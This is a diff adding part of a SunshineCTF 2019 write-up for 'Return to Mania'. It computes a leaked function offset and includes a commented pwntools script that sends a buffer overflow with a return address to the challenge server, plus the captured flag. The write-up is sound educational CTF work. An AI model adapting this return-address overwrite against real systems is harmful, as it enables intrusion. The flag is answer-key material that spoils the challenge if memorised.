@@ -27,3 +27,47 @@ I always start by looking at the functions, then disassembling them.
 ![](/Images/2019/SunshineCTF/retwelc.PNG)
 
 ![](/Images/2019/SunshineCTF/remania.PNG)
+
+Interesting. `main` calls `welcome`, but `welcome` never calls `mania`, regardless of the key you put in. So `mania` is probably our goal function here, since the title is literally "Return to Mania". But what does `mania` do? I set a breakpoint at main, ran the program, and when it broke, set the program counter to the address of mania.
+
+![](/Images/2019/SunshineCTF/maniainteresting.PNG)
+
+Bingo. That's what we want. The address of mania is `0x90` less than the address welcome, and hopefully that's the case for the remote version too. Fun fact: I spent a long time trying to figure out why my code didn't work, and it turned out that I originally did my math wrong (I thought it was `0xA0`).
+
+![](/Images/2019/SunshineCTF/addressesret.PNG)
+
+I then proceeded to use good old <a href='https://github.com/Gallopsled/pwntools'>pwntools</a> to start making my hack. Its a bit messy, so I added some comments to help. This was my final code.
+```
+from pwn import *
+context.log_level = 'debug'               #debug mode, so I can see exactly what my code is doing. Suggested by kcolley
+r = remote('ret.sunshinectf.org',4301)    #connect to the service
+#r = process('./return-to-mania')         #comment out above line and uncomment this one to test locally
+data = r.recvuntil('\n')                  #receive the first line, but I don't care about it so...
+data = r.recvuntil('\n')                  #overwrite the first line with the second
+print data                                #debug print
+
+x = data[-11:]                            #get the address of welcome
+x = int(x,0)                              #convert the hex string to an integer
+target = x - int('0x90', 0)               #subtract 0x90 from the address (
+
+target = hex(target)                      #convert the address back to hex for debug purposes
+print target                              #debug print
+
+target = int(target, 0)                   #convert it back into integer for actual use
+print target                              #debug print
+
+target = p32(target, endian='little')     #convert the integer into a 32 bit architecture little endian address
+print target                              #debug print, should print utf-8 encoded hex (often has unprintables)
+r.sendline('a'*22+target)                 #send the exploit on over! Thanks to kcolley for suggesting sendline and not just send
+print r.recv()                            #print the first line, had no flag so:
+print r.recv()                            #print next line (flag)
+```
+I ran it locally with success:
+
+![](/Images/2019/SunshineCTF/localtestret.PNG)
+
+And then got the flag from the service:
+
+![](/Images/2019/SunshineCTF/serviceret.PNG)
+
+flag: `sun{0V3rfl0w_rUn_w!Ld_br0th3r}`
